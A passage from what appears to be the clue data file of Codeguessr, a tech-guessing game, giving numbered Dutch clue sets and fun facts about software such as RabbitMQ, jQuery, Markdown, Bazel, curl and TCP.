      'Apache Spark en Akka zijn erin geschreven.',
      'De JVM-taal waarvan versie 3 tijdens de ontwikkeling Dotty heette.'
    ],
    funFact: 'De maker schreef ook de generics van Java en de javac-compiler die daarmee kwam.'
  },
  58: {
    clues: [
      'Het werd in 2007 voor het eerst uitgebracht door een joint venture van twee Britse bedrijven.',
      'Het is geschreven in Erlang.',
      'Het werd gebouwd om AMQP 0-9-1 te implementeren.',
      'Producers publiceren naar exchanges, die berichten naar queues routeren.',
      'De beheerinterface draait meestal op poort 15672.',
      'De populaire open-source message broker met een dier in de naam.'
    ],
    funFact: 'SpringSource, onderdeel van VMware, kocht het in 2010; via Pivotal en VMware is Broadcom nu de eigenaar.'
  },
  59: {
    clues: [
      'John Resig kondigde het in 2006 aan op BarCamp NYC.',
      'Het motto was "write less, do more".',
      'Het streek de verschillen tussen Internet Explorer en de rest glad.',
      'De dollarteken-functie selecteert elementen met CSS-selectors.',
      '$(document).ready() was de eerste regel van talloze scripts.',
      'De JavaScript-library die ooit op het grootste deel van het web draaide.'
    ],
    funFact: 'Zelfs in de jaren 2020 draait het nog op het merendeel van de miljoen grootste websites.'
  },
  60: {
    clues: [
      'John Gruber maakte het in 2004, met hulp van Aaron Swartz.',
      'Het doel was platte tekst die al goed leest voordat hij wordt omgezet.',
      'CommonMark wilde de onduidelijkheden in de oorspronkelijke beschrijving oplossen.',
      'Een # maakt een kop en sterretjes geven nadruk.',
      'README-bestanden op GitHub zijn meestal erin geschreven.',
      'De lichtgewicht opmaaktaal, in bestanden die op .md eindigen.'
    ],
    funFact: 'De README van Codeguessr is, zoals die van bijna elke repository, erin geschreven.'
  },
  61: {
    clues: [
      'Het eerste prototype werd in ongeveer tien dagen geschreven, in mei 1995.',
      'Het heette eerst Mocha en daarna LiveScript, tot een marketingdeal het zijn definitieve naam gaf.',
      'De officiële standaard heeft een andere naam en wordt onderhouden door een commissie die TC39 heet.',
      "typeof null geeft 'object' terug, een bug uit de eerste versie die nooit meer gerepareerd kan worden.",
      'Brendan Eich maakte het bij Netscape, en nu draait elke browser het.',
      'De taal van het web, die buiten de naam niets met Java te maken heeft.'
    ],
    funFact: 'Het merk op de naam is van Oracle, dat het van Sun Microsystems erfde; dat is een van de redenen dat de standaard ECMAScript heet.'
  },
  62: {
    clues: [
      'Akamai, in 1998 opgericht door onderzoekers van MIT, was de pionier.',
      'Het houdt kopieën van bestanden op servers dicht bij gebruikers over de hele wereld.',
      'Die servers heten edge servers of points of presence.',
      'In juni 2021 legde één instellingswijziging van een klant bij Fastly veel grote websites plat.',
      'Cloudflare en Fastly zijn grote aanbieders.',
      'Een Content Delivery Network.'
    ],
    funFact: 'De storing bij Fastly in 2021 duurde nog geen uur, maar legde sites als Amazon, Reddit en de BBC plat.'
  },
  63: {
    clues: [
      'Ken Thompson en Rob Pike ontwierpen het in 1992 op een placemat in een wegrestaurant in New Jersey.',
      'Het gebruikt één tot vier bytes per teken.',
      'Elk puur ASCII-bestand is er al geldig in.',
      'Bijna elke webpagina is er vandaag mee gecodeerd.',
      '<meta charset="..."> in HTML noemt het meestal.',
      'De meestgebruikte Unicode-codering, met een naam die op 8 eindigt.'
    ],
    funFact: 'Het werd in één avond ontworpen, en binnen enkele dagen hadden Thompson en Pike hun besturingssysteem Plan 9 erop omgezet.'
  },
  64: {
    clues: [
      "Andy Rubin en anderen richtten het bedrijf in 2003 op, eerst gericht op digitale camera's.",
      'Google kocht het bedrijf in 2005.',
      'De eerste telefoon die het draaide, was de HTC Dream, in 2008.',
      'Tien jaar lang werden versies genoemd naar zoetigheid, in alfabetische volgorde.',
      'Het is het meestgebruikte besturingssysteem ter wereld.',
      'Het mobiele besturingssysteem van Google, met een groene robot als mascotte.'
    ],
    funFact: 'De namen liepen van Cupcake tot Pie, en versie 10 in 2019 was de eerste die de traditie publiekelijk losliet.'
  },
  65: {
    clues: [
      'Tom Preston-Werner, medeoprichter van GitHub, maakte het in 2013.',
      'Het wil eenduidig overeenkomen met een hashtabel.',
      'Secties schrijf je als kopjes tussen vierkante haken.',
      'Cargo van Rust leest zijn manifest in dit formaat.',
      'De pyproject-bestanden van Python gebruiken het ook.',
      "Het configuratieformaat met de naam 'Tom's Obvious, Minimal Language'."
    ],
    funFact: "De maker noemde het naar zichzelf: Tom's Obvious, Minimal Language."
  },
  66: {
    clues: [
      "Ted Neward noemde het in 2006 beroemd genoeg 'the Vietnam of computer science'.",
      "Het probeert de 'impedance mismatch' tussen objecten en tabellen te overbruggen.",
      'Het N+1-queryprobleem is de bekendste valkuil.',
      'Hibernate, Active Record en Prisma zijn voorbeelden.',
      'Je werkt ermee met rijen alsof het objecten in je taal zijn.',
      'Object-relational mapping.'
    ],
    funFact: 'Volgens de vergelijking van Ted Neward stap je er makkelijk in, maar kom je er heel moeilijk met een schone overwinning uit.'
  },
  67: {
    clues: [
      'Het begon als 1-aprilgrap van Armin Ronacher in 2010.',
      'Het is gebouwd op Werkzeug en de template-engine Jinja.',
      'Het noemt zichzelf een microframework.',
      "Routes worden gedeclareerd met een decorator zoals @app.route('/').",
      'Het wordt onderhouden door het Pallets-project, een lichtgewicht alternatief voor Django.',
      'Het Python-webframework genoemd naar een fles of kolf.'
    ],
    funFact: 'De grap was een nepframework dat Denied heette, in één bestand gepropt; mensen vonden het idee zo goed dat het een echt project werd.'
  },
  68: {
    clues: [
      'Joe Becker, Lee Collins en Mark Davis begonnen er eind jaren 80 aan.',
      'Het eerste deel werd in 1991 gepubliceerd.',
      'Elk teken krijgt een codepunt, geschreven als U+0041.',
      'Het bevat ruim meer dan 150.000 tekens, van oude schriften tot emoji.',
      'Een consortium bepaalt welke nieuwe emoji erbij komen.',
      'De universele standaard voor het coderen van de tekens van elk schrift.'
    ],
    funFact: 'Een voorstel om het Klingon-alfabet uit Star Trek toe te voegen, werd in 2001 afgewezen.'
  },
  69: {
    clues: [
      'Het ontstond in 2019 door OpenTracing en OpenCensus samen te voegen.',
      'Het is een leveranciersonafhankelijke standaard voor traces, metrics en logs.',
      'De data reist via een protocol dat OTLP heet.',
      'Een onderdeel dat de Collector heet, ontvangt, verwerkt en exporteert de data.',
      'Het is een van de actiefste projecten in de Cloud Native Computing Foundation.',
      'De open standaard voor observability, vaak afgekort tot OTel.'
    ],
    funFact: 'Het wordt vaak genoemd als het op een na actiefste CNCF-project, direct na Kubernetes.'
  },
  70: {
    clues: [
      'Het ontstond midden jaren 90 omdat de compressie van een ander afbeeldingsformaat gepatenteerd was.',
      'De onofficiële uitleg van de naam is een recursieve steek naar dat oudere formaat.',
      'Het is lossless en ondersteunt een volledig alfakanaal voor transparantie.',
      'Elk bestand begint met de bytes \\x89 gevolgd door de eigen naam.',
      "Het is de gebruikelijke keuze voor screenshots en logo's.",
      "Het afbeeldingsformaat Portable Network Graphics, uitgesproken als 'ping'."
    ],
    funFact: "De onofficiële recursieve afkorting is 'PNG's Not GIF'."
  },
  71: {
    clues: [
      'Het werd in 2011 opgericht in San Francisco.',
      'De configuratie staat in een config.yml in een verborgen map.',
      'Herbruikbare pakketjes configuratie heten orbs.',
      'In januari 2023 vroeg het elke klant om na een inbraak alle secrets te vervangen.',
      'Het is een gehoste continuous-integrationdienst die je tests bij elke push draait.',
      'De CI-dienst met een ronde vorm in de naam.'
    ],
    funFact: 'Het beveiligingsincident van 2023 begon met malware op de laptop van één engineer.'
  },
  72: {
    clues: [
      "Michael 'Monty' Widenius begon eraan in 2009.",
      'Het was een fork, gemaakt uit zorg nadat Oracle Sun kocht.',
      'Het wil een directe vervanger zijn voor de database waarvan het een fork is.',
      'Veel Linux-distributies vervingen het origineel erdoor.',
      'Het logo is een zeeleeuw.',
      'De fork van MySQL, genoemd naar de jongste dochter van de maker.'
    ],
    funFact: 'Monty noemde zijn databases naar zijn kinderen: My, Maria, en Max voor MaxDB.'
  },
  73: {
    clues: [
      'Jason Miller bracht het in 2015 uit.',
      'Het weegt ongeveer 3 kB, een fractie van de library die het nadoet.',
      'Met een compatibiliteitslaag kun je het inwisselen voor een veel grotere library.',
      'Het hielp signals voor state management populair te maken in zijn ecosysteem.',
      'Het biedt dezelfde moderne API als React.',
      'Het piepkleine alternatief voor React met twee extra letters vooraan.'
    ],
    funFact: "De maker schreef de blogpost uit 2020 die de term 'islands architecture' populair maakte."
  },
  74: {
    clues: [
      'Stephen Dolan bracht het in 2012 uit.',
      'Het is in C geschreven en heeft geen runtime-afhankelijkheden.',
      'Het wordt wel sed voor een populair dataformaat genoemd.',
      'Filters zien eruit als .items[] | .name.',
      'Ontwikkelaars pipen API-antwoorden erdoorheen om ze leesbaar te maken.',
      'De JSON-verwerker voor de commandline met een naam van twee letters.'
    ],
    funFact: 'De filtertaal is een volledige functionele taal, met variabelen, functies en recursie.'
  },
  75: {
    clues: [
      'De OpenID Foundation maakte het in 2014 definitief.',
      'Het voegt een identiteitslaag toe bovenop OAuth 2.0.',
      'Het geeft de app een ID-token, en dat is een JWT.',
      'Het discovery-document staat op /.well-known/openid-configuration.',
      "'Inloggen met Google' is erop gebouwd.",
      'Het identiteitsprotocol dat vaak wordt afgekort tot OIDC.'
    ],
    funFact: 'OAuth alleen geeft toegang; deze laag erbovenop vertelt een app wie de gebruiker eigenlijk is.'
  },
  76: {
    clues: [
      'Het werd in 2016 gemaakt door een klein bedrijf dat Kadira heette.',
      'Toen dat bedrijf stopte, nam de community het over.',
      "Je schrijft 'stories', die elk een component in één toestand laten zien.",
      'Het draait als aparte werkplaats-app naast je echte app.',
      'Designsystemen gebruiken het om UI-componenten los te ontwikkelen en te documenteren.',
      'De werkplaats voor UI-componenten, genoemd naar een prentenboek.'
    ],
    funFact: 'Het storyformaat, Component Story Format, is gewoon ES-modules, dus dezelfde stories kun je in tests hergebruiken.'
  },
  77: {
    clues: [
      'Google gebruikte het intern vanaf ongeveer 2001 en maakte het in 2008 open source.',
      'Berichten worden beschreven in .proto-bestanden.',
      'Elk veld heeft een nummer, en dat nummer gaat over de lijn in plaats van de naam.',
      'Een compiler die protoc heet, genereert code voor veel talen.',
      'gRPC gebruikt het als standaard berichtformaat.',
      'Het compacte binaire serialisatieformaat van Google, vaak afgekort tot protobuf.'
    ],
    funFact: 'Omdat velden aan nummers herkend worden, kun je nieuwe velden toevoegen zonder oude lezers kapot te maken.'
  },
  78: {
    clues: [
      'James Long bracht het in 2017 uit.',
      'De naam verwijst naar een paper van Philip Wadler uit de jaren 90 over het printen van code.',
      'Het biedt bewust heel weinig opties, om discussies over stijl te stoppen.',
      'Het gooit je opmaak weg en print de code helemaal opnieuw.',
      'De instellingen staan in een bestand zoals .prettierrc.',
      "De eigenwijze codeformatter met een Engelse naam die 'mooier' betekent."
    ],
    funFact: "Het algoritme is gebaseerd op het paper 'A prettier printer' van Philip Wadler."
  },
  79: {
    clues: [
      'Het begon als Google Summer of Code-project van David Cournapeau in 2007.',
      'Het Franse onderzoeksinstituut INRIA nam de leiding in de ontwikkeling.',
      'Elk model volgt hetzelfde patroon: fit, en dan predict.',
      'Random forests, k-means en logistische regressie liggen allemaal op één import afstand.',
      'De importnaam is sklearn.',
      "De klassieke machine-learninglibrary voor Python, genoemd als een 'SciPy-toolkit'."
    ],
    funFact: "De 'scikit' in de naam betekent SciPy-toolkit, een naam voor uitbreidingspakketten bovenop SciPy."
  },
  80: {
    clues: [
      'Twee statistici aan de Universiteit van Auckland begonnen eraan in het begin van de jaren 90.',
      'Het is een opensource-versie van S, een statistiektaal van Bell Labs.',
      'De gebruikelijkste toekenningsoperator is een pijl: <-.',
      'Packages zoals ggplot2 en de tidyverse komen uit het archief CRAN.',
      'Statistici en datawetenschappers gebruiken het voor dataframes, modellen en grafieken.',
      'De statistiektaal met een naam van één letter.'
    ],
    funFact: 'De naam komt van de eerste letter van de voornamen van de makers, Ross Ihaka en Robert Gentleman, en knipoogt naar S.'
  },
  81: {
    clues: [
      'John-David Dalton begon eraan in 2012 als fork van Underscore.js.',
      'De naam is een woordgrap: een ander woord voor het teken waaronder je het importeert.',
      'debounce, throttle, get en cloneDeep zijn enkele van de bekendste functies.',
      'Jarenlang was het een van de packages op npm waar de meeste andere van afhingen.',
      'Modern JavaScript maakte veel van de functies overbodig.',
      'De JavaScript-utilitylibrary die je importeert als _.'
    ],
    funFact: "De naam speelt met 'low dash', een andere naam voor het underscoreteken waaronder het meestal wordt geïmporteerd."
  },
  82: {
    clues: [
      'Het W3C publiceerde de Level 1-specificatie in 1998.',
      "Daarvoor hadden browsers onderling onverenigbare versies, nu 'Level 0' genoemd.",
      'Het stelt een HTML-pagina voor als een boom van nodes.',
      'document.getElementById en querySelector doorzoeken het.',
      "React maakte een 'virtuele' kopie ervan populair.",
      'Het Document Object Model.'
    ],
    funFact: 'Aan de echte versie komen is traag vergeleken met gewone JavaScript, daarom proberen frameworks wijzigingen te bundelen.'
  },
  83: {
    clues: [
      'Google maakte het in 2015 open source.',
      'Intern gebruikt Google nog een versie met een anagram van de naam.',
      'De buildbestanden zijn in Starlark geschreven, een dialect van Python.',
      'Het streeft naar hermetische, reproduceerbare builds met remote caching en uitvoering.',
      "Het is gemaakt voor enorme monorepo's in veel talen.",
      'Het buildsysteem van Google, met de Engelse naam van een kruid.'
    ],
    funFact: 'De naam is een anagram van Blaze, het interne buildsysteem van Google waar het uit voortkwam.'
  },
  84: {
    clues: [
      "De makers kondigden het in 2012 aan in een blogpost waarin ze zeiden 'hebberig' te zijn.",
      'Het wil de snelheid van een gecompileerde taal met het gemak van een scripttaal.',
      'Multiple dispatch staat centraal in het ontwerp.',
      'Het compileert just-in-time via LLVM, en arrays beginnen bij 1.',
      'Het komt van MIT en is populair in wetenschappelijk rekenwerk.',
      'De numerieke taal met een vrouwennaam.'
    ],
    funFact:
      "De post 'Why We Created Julia' uit 2012 wilde de snelheid van C, de dynamiek van Ruby, de wiskundige notatie van Matlab en meer, allemaal in één taal."
  },
  85: {
    clues: [
      'Het werd voor het eerst uitgebracht in Zweden in 1995.',
      'Het is de M in de LAMP-stack.',
      'Sun Microsystems kocht het in 2008 voor ongeveer een miljard dollar.',
      'Oracle werd in 2010 eigenaar, wat leidde tot een bekende fork.',
      'Het dolfijnenlogo heet Sakila.',
      'De populaire opensourcedatabase genoemd naar My, de dochter van Monty Widenius.'
    ],
    funFact: 'De dolfijn heet Sakila na een naamwedstrijd, gewonnen door een ontwikkelaar uit Eswatini.'
  },
  86: {
    clues: [
      'Het bedrijf van Tim Sweeney bracht het in 1998 uit met een first-person shooter met dezelfde naam.',
      'Je programmeert het in C++ of met visuele nodegrafen die Blueprints heten.',
      'De vijfde versie bracht Nanite-geometrie en Lumen-belichting.',
      'The Mandalorian werd gefilmd voor ledwanden die er live mee werden gerenderd.',
      'Fortnite is erop gebouwd.',
      'De game-engine van Epic Games, met een Engelse naam die onwerkelijk betekent.'
    ],
    funFact: 'Film- en tv-producties gebruiken het nu voor virtuele decors, met achtergronden die realtime op enorme ledschermen worden gerenderd.'
  },
  87: {
    clues: [
      'Fabien Potencier bracht het in 2005 uit bij het Franse bureau SensioLabs.',
      "De naam werd deels gekozen om het voorvoegsel 'sf' te houden dat al in de code stond.",
      'De losse componenten worden gebruikt door Laravel, Drupal en vele anderen.',
      'De template-engine is Twig.',
      'Applicaties worden georganiseerd in bundles.',
      'Het PHP-framework met een naam die klinkt als een orkeststuk.'
    ],
    funFact: 'Laravel, de grootste concurrent, is gebouwd op veel van de componenten.'
  },
  88: {
    clues: [
      'Daniel Stenberg uit Zweden leidt het sinds het in 1998 zijn huidige naam kreeg.',
      'Het begon als tool om wisselkoersen op te halen voor een IRC-bot.',
      "De library draait in auto's, tv's, telefoons en spelcomputers.",
      'Opties als -X, -H, -d en -L kennen veel ontwikkelaars uit hun hoofd.',
      'Het ondersteunt tientallen protocollen, niet alleen HTTP.',
      "De commandlinetool om data over te dragen met URL's."
    ],
    funFact: 'Volgens de website draait het in meer dan twintig miljard installaties wereldwijd.'
  },
  89: {
    clues: [
      'De eerste drafts verschenen in 2009, en de syntax veranderde twee keer voordat browsers het eens waren.',
      'Het plaatst items langs één hoofdas.',
      'justify-content en align-items zijn de meestgebruikte properties.',
      'Eindelijk werd het makkelijk om een div verticaal te centreren.',
      'Een spelletje met een kikker op een waterlelie leert het je.',
      'De CSS-layoutmodus die je aanzet met display: flex.'
    ],
    funFact: 'Het browserspel Flexbox Froggy leert het je door kikkers naar hun waterlelies te verplaatsen.'
  },
  90: {
    clues: [
      'Een bedrijf dat in 2000 in Praag werd opgericht, bracht het in 2001 uit.',
      "De refactorings en code-aanvulling legden de lat hoger voor Java-IDE's.",
      'De makers maakten ook de taal Kotlin.',
      'Android Studio is gebouwd op de opensource-editie.',
      'Er is een gratis Community-editie en een betaalde Ultimate-editie.',
      'De vlaggenschip-IDE voor Java van JetBrains.'
    ],
    funFact: 'JetBrains werd in Praag opgericht door drie Russische ontwikkelaars en heeft daar nog steeds een groot kantoor.'
  },
  91: {
    clues: [
      'Het werd populair door het boek The Pragmatic Programmer uit 1999.',
      'Er is geen software voor nodig, alleen een geduldige luisteraar.',
      'Je legt je code regel voor regel hardop uit.',
      'Halverwege de uitleg zie je de bug meestal zelf.',
      'De luisteraar is traditioneel een geel badspeeltje.',
      'Je code uitleggen aan een speelgoedeendje om een bug te vinden.'
    ],
    funFact: "Voor 1 april 2018 lanceerde Stack Overflow 'Quack Overflow', een geanimeerde eend die naar je vragen luisterde."
  },
  92: {
    clues: [
      'Het kwam uit het Apache Jakarta-project en bereikte in 2004 versie 1.0.',
      'Het verkiest conventie boven configuratie: code staat in src/main/java.',
      'Elk artefact heeft een groupId, een artifactId en een versie.',
      'De centrale repository is waar de meeste Java-libraries gepubliceerd worden.',
      'Het projectbestand heet pom.xml.',
      'De Java-buildtool met een naam die Jiddisch is voor een expert.'
    ],
    funFact: 'De naam komt uit het Jiddisch, waar een maven iemand is die veel kennis heeft verzameld.'
  },
  93: {
    clues: [
      'Het werd in 1998 vastgelegd omdat het internet door zijn adressen heen raakte.',
      'De adressen zijn 128 bits lang.',
      'Ze worden in hexadecimale groepen geschreven, gescheiden door dubbele punten.',
      'Het loopbackadres is ::1.',
      'Grote websites zetten het blijvend aan tijdens de World Launch op 6 juni 2012.',
      'De opvolger van IPv4.'
    ],
    funFact: 'Versie 5 werd overgeslagen, omdat dat nummer al gebruikt was voor een experimenteel streamingprotocol.'
  },
  94: {
    clues: [
      'Stuart Feldman schreef het in 1976 bij Bell Labs.',
      'Het bouwt een target alleen opnieuw als een van de prerequisites nieuwer is.',
      'Receptregels moeten met een tab beginnen, niet met spaties.',
      'Veel projecten gebruiken .PHONY-targets zoals all, clean en install.',
      'De instructies staan in een bestand dat Makefile heet.',
      'De klassieke Unix-buildtool met een Engels werkwoord voor maken als naam.'
    ],
    funFact: "Feldman zei later dat hij de verplichte tab hield omdat hij al zo'n tien gebruikers had en hun bestanden niet kapot wilde maken."
  },
  95: {
    clues: [
      'Het bedrijf van Mark Shuttleworth bracht de eerste versie uit in oktober 2004.',
      'De versienummers zijn het jaar en de maand van de release, zoals 24.04.',
      'Elke release heeft een allitererende dierencodenaam, zoals Noble Numbat.',
      'Het is gebaseerd op Debian, en om de twee jaar komt er een versie met langetermijnondersteuning.',
      'Canonical maakt het, en het is een van de populairste Linux-distributies.',
      'De Linux-distributie genoemd naar een zuidelijk-Afrikaans woord voor menselijkheid naar anderen.'
    ],
    funFact: 'De allereerste release heette Warty Warthog, en sinds Dapper Drake volgen de codenamen het alfabet.'
  },
  96: {
    clues: [
      'Paul Falstad schreef de eerste versie in 1990 als student aan Princeton.',
      'De naam kwam van de loginnaam van een onderwijsassistent aan Princeton.',
      'Met glob qualifiers schrijf je dingen als *(.m-1) voor bestanden die vandaag zijn gewijzigd.',
      "Een communityframework dat Oh My … heet, maakte het beroemd om thema's en plug-ins.",
      'Sinds macOS Catalina in 2019 is het de standaardshell op de Mac.',
      'De Z shell.'
    ],
    funFact: 'De naam komt van Zhong Shao, toen onderwijsassistent aan Princeton, met de login zsh.'
  },
  97: {
    clues: [
      'Mark Raasveldt en Hannes Mühleisen maakten het in 2019 bij het CWI in Amsterdam.',
      'Het draait in je eigen proces, zonder server om te installeren.',
      'Het wordt vaak omschreven als SQLite voor analyses.',
      'Het bevraagt CSV- en Parquet-bestanden direct met SQL.',
      'Datawetenschappers gebruiken het vanuit Python, R en zelfs de browser.',
      'De analytische database genoemd naar een watervogel.'
    ],
    funFact: 'Het ontstond bij het Nederlandse onderzoeksinstituut CWI en is genoemd naar een huiseend die Wilbur heette.'
  },
  98: {
    clues: [
      'Alex Russell en Frances Berriman bedachten de term in 2015.',
      'In 2007 vertelde Steve Jobs ontwikkelaars eerst om iPhone-apps op deze manier te bouwen.',
      'Het heeft een web app manifest en een service worker nodig.',
      'Het kan op het beginscherm worden geïnstalleerd en offline werken.',
      'Codeguessr is er een.',
      'Een Progressive Web App.'
    ],
    funFact: "Voordat de App Store bestond, noemde Steve Jobs webapps voor de iPhone een 'very sweet solution'."
  },
  99: {
    clues: [
      'Een team onder leiding van Lars Bak in Aarhus, Denemarken, bouwde het voor Google.',
      'Het werd in 2008 meegeleverd met de eerste versie van Chrome.',
      'Het compileert JavaScript naar machinecode in plaats van het alleen te interpreteren.',
      'De pipeline heeft een interpreter die Ignition heet en een optimaliserende compiler die TurboFan heet.',
      'Node.js en Deno zijn erop gebouwd.',
      'De JavaScript-engine van Google, genoemd naar een automotor.'
    ],
    funFact: 'De snelheid ontketende een prestatiewedloop tussen browsers die moderne webapps mogelijk maakte.'
  },
  100: {
    clues: [
      'Het begon in 2016, en Zoltan Kochan werd de vaste maintainer.',
      'Het houdt één content-addressable opslag bij van elke packageversie op je schijf.',
      'Het linkt packages naar node_modules in plaats van ze te kopiëren.',
      'De strikte indeling voorkomt dat code packages importeert die niet gedeclareerd zijn.',
      "Het staat erom bekend dat het gigabytes schijfruimte bespaart in grote monorepo's.",
      "De 'performant' pakketbeheerder, met een naam van vier kleine letters."
    ],
    funFact: 'Omdat elke versie maar één keer wordt opgeslagen, delen honderd projecten met dezelfde library één kopie op schijf.'
  },
  101: {
    clues: [
      'Tim Wood bracht het in 2011 uit.',
      'Het maakte het parsen en opmaken van datums in JavaScript draaglijk.',
      "Aanroepen als .add(7, 'days').format('LL') zijn typisch.",
      'De objecten zijn mutable, wat veel subtiele bugs veroorzaakte.',
      'In 2020 raadden de eigen maintainers af om het nog in nieuwe projecten te gebruiken.',
      'De klassieke JavaScript-library voor datums met een Engelse naam voor een ogenblik.'
    ],
    funFact: 'De maintainers verwijzen nu naar Luxon, Day.js, date-fns en de komende Temporal-API.'
  },
  102: {
    clues: [
      'De eerste openbare dienst, een message queue, verscheen in 2004.',
      'In 2006 lanceerde het objectopslag en virtuele servers, en toen ging cloud computing hard.',
      'Andy Jassy leidde het voordat hij CEO van het moederbedrijf werd.',
      'Als de regio us-east-1 een slechte dag heeft, merkt het halve internet dat.',
      'De jaarlijkse conferentie in Las Vegas heet re:Invent.',
      'Het cloudplatform van Amazon, met een afkorting van drie letters.'
    ],
    funFact: 'De eerste dienst die openbaar werd, was SQS, de Simple Queue Service, in 2004, twee jaar voor S3 en EC2.'
  },
  103: {
    clues: [
      'Het kwam uit het Vite-team, met Anthony Fu als een van de makers, rond 2021.',
      'Het hergebruikt je Vite-configuratie en plug-ins.',
      'De API is compatibel met Jest, dus describe, it en expect werken hetzelfde.',
      'Het kan tests in een echte browser draaien, en zelfs tests in bronbestanden.',
      'De databasetests van Codeguessr draaien ermee.',
      "De testrunner op basis van Vite, met 'test' in de naam."
    ],
    funFact: 'De nieuwere unittestbuilder van Angular kan het gebruiken in plaats van Karma, en dat doet Codeguessr ook.'
  },
  104: {
    clues: [
      'Jesper Nøhr lanceerde het in 2008.',
      'In het begin hostte het alleen Mercurial-repositories.',
      'Atlassian kocht het in 2010.',
      'In 2020 stopte het volledig met Mercurial.',
      'Het werkt nauw samen met Jira en Confluence.',
      'De Git-hostingdienst van Atlassian, genoemd naar een emmer vol bits.'
    ],
    funFact: 'Het was een van de laatste grote hosts voor Mercurial, daarom haalde het besluit om daarmee te stoppen in 2020 het nieuws.'
  },
  105: {
    clues: [
      'Het groeide uit de interne chattool van een gamestudio die een game maakte die Glitch heette.',
      'Medeoprichter Stewart Butterfield had eerder Flickr mede opgericht.',
      'De naam is uitgelegd als backroniem: Searchable Log of All Conversation and Knowledge.',
      'Salesforce kocht het in 2021 voor ongeveer 27,7 miljard dollar.',
      'Kanalen die met # beginnen, vervingen een hoop werkmail.',
      'De chatapp voor werk met een Engelse naam die ook los of lui betekent.'
    ],
    funFact: 'Ook Flickr kwam voort uit een mislukte online game van dezelfde oprichter, Game Neverending.'
  },
  106: {
    clues: [
      'Elke instructie die je schrijft, komt overeen met precies één machine-instructie.',
      'Afkortingen zoals MOV, JMP en PUSH staan in plaats van kale getallen.',
      'Je beheert registers en de stack met de hand.',
      'Er is een andere variant voor elke processorfamilie, zoals x86 of ARM.',
      'De laagste taal die de meeste programmeurs ooit zien.',
      'De taal met een Engelse naam die ook vergadering of montage betekent.'
    ],
    funFact: 'De game RollerCoaster Tycoon uit 1999 werd bijna helemaal in deze taal geschreven, door één ontwikkelaar: Chris Sawyer.'
  },
  107: {
    clues: [
      'Microsoft bracht het in 2020 uit.',
      'Het werd gebouwd door dezelfde mensen die bij Google een vergelijkbare tool hadden gemaakt.',
      'Eén API stuurt Chromium, Firefox en WebKit aan.',
      'Het wacht automatisch op elementen, en codegen neemt je klikken op als test.',
      'De end-to-endtests van Codeguessr zijn ermee geschreven.',
      'Het framework voor browserautomatisering en testen met een Engelse naam voor een toneelschrijver.'
    ],
    funFact: 'Met de trace viewer loop je door een mislukte CI-test, met screenshots, netwerkverkeer en consolelogs voor elke actie.'
  },
  108: {
    clues: [
      'De Duitse wiskundige Paul Bachmann introduceerde het in 1894.',
      "Edmund Landau maakte het populair, en de letter stond oorspronkelijk voor 'Ordnung'.",
      'Donald Knuth bracht het in de jaren 70 naar de informatica.',
      'Het beschrijft hoe de looptijd groeit als de invoer groeit, zonder constanten.',
      'O(1), O(log n), O(n log n) en O(n²) zijn de bekendste leden.',
      'De notatie om de complexiteit van een algoritme te beschrijven, genoemd naar een hoofdletter.'
    ],
    funFact: 'In een brief uit 1976 betoogde Knuth dat de letter eigenlijk een Griekse omikron is.'
  },
  109: {
    clues: [
      'Maxime Beauchemin begon eraan bij Airbnb in 2014.',
      'Workflows worden in Python gedefinieerd als gerichte acyclische grafen.',
      'Elke stap in een workflow is een operator, en een scheduler draait ze op tijd.',
      'Het werd in 2019 een top-level Apache-project.',
      'Data-engineers orkestreren er hun pipelines mee.',
      'De workflowplanner met een Engelse naam voor luchtstroom.'
    ],
    funFact: 'De maker bedacht bij Airbnb ook Apache Superset, een tool voor datavisualisatie.'
  },
  110: {
    clues: [
      'Het werd in 2008 aangekondigd onder de codenaam Red Dog.',
      'Het verscheen in 2010 met de naam van het besturingssysteem van de maker ervoor.',
      'Dat voorvoegsel werd in 2014 vervangen door de naam van het bedrijf zelf.',
      'Door het grote partnerschap met OpenAI werd het de thuisbasis van veel AI-werk.',
      'Het is het op een na grootste cloudplatform, na dat van Amazon.',
      'De cloud van Microsoft, genoemd naar een helder hemelsblauw.'
    ],
    funFact: 'Het begon als Windows Azure en werd in 2014 hernoemd tot Microsoft Azure, omdat het steeds meer Linux draaide.'
  },
  111: {
    clues: [
      'Nicholas C. Zakas maakte het in 2013.',
      'Anders dan eerdere tools is elke regel een plug-in die je aan of uit kunt zetten.',
      "Versie 9 maakte een nieuw 'flat config'-bestand de standaard.",
      'Met een speciaal commentaar zet je een van de regels uit voor alleen de volgende regel code.',
      'Het is de meestgebruikte linter voor JavaScript en TypeScript.',
      'De uitbreidbare JavaScript-linter, genoemd naar ECMAScript en lint.'
    ],
    funFact: 'De maker schreef het omdat JSHint niet makkelijk uit te breiden was met eigen regels.'
  },
  112: {
    clues: [
      "Het werd beschreven in een paper uit 1936 met de titel 'On Computable Numbers'.",
      'Het heeft een oneindige tape, een lees-schrijfkop en een tabel met toestanden.',
      'Ermee werd bewezen dat het stopprobleem niet op te lossen is.',
      "Een taal die het kan simuleren, heet naar de uitvinder 'compleet'.",
      'De uitvinder kraakte ook codes op Bletchley Park.',
      'Het abstracte rekenmodel van Alan Turing.'
    ],
    funFact: 'Turing schreef het paper toen hij 23 was, voordat moderne computers bestonden.'
  },
  113: {
    clues: [
      'Vint Cerf en Bob Kahn beschreven het in een paper uit 1974.',
      "Op 1 januari 1983 stapte het ARPANET er in één keer op over, op een 'flag day'.",
      'Elke verbinding begint met een three-way handshake: SYN, SYN-ACK, ACK.',
      'Het garandeert dat bytes op volgorde aankomen en stuurt opnieuw wat verloren gaat.',
      'HTTP/1.1 en HTTP/2 draaien erop.',
      'Het Transmission Control Protocol.'
    ],
    funFact: "Congestiebeheer werd in 1988 toegevoegd door Van Jacobson, nadat het vroege internet een reeks 'congestion collapses' had meegemaakt."
  },
  114: {
    clues: [
      'Andreas Reuter en Theo Härder bedachten de afkorting in 1983.',
      'Het bouwt op het eerdere werk van Jim Gray over transacties.',
      'Het belooft alles-of-niets, geldige toestanden, geen onderlinge hinder en geen dataverlies na een commit.',
      'NoSQL-systemen bieden soms BASE in plaats daarvan, als scheikundegrap.',
      'Transacties in PostgreSQL garanderen het.',
      'Atomicity, Consistency, Isolation, Durability.'
    ],
    funFact: 'BASE, het lossere alternatief, staat voor Basically Available, Soft state, Eventual consistency, gekozen als scheikundige tegenhanger.'
  },
  115: {
    clues: [
      'Marc Andreessen en Jim Clark richtten het bedrijf erachter in 1994 op.',
      'Veel ontwikkelaars hadden eerder Mosaic gebouwd aan de University of Illinois.',
      'De beursgang van het bedrijf in 1995 was het startsein voor de dotcomhype.',
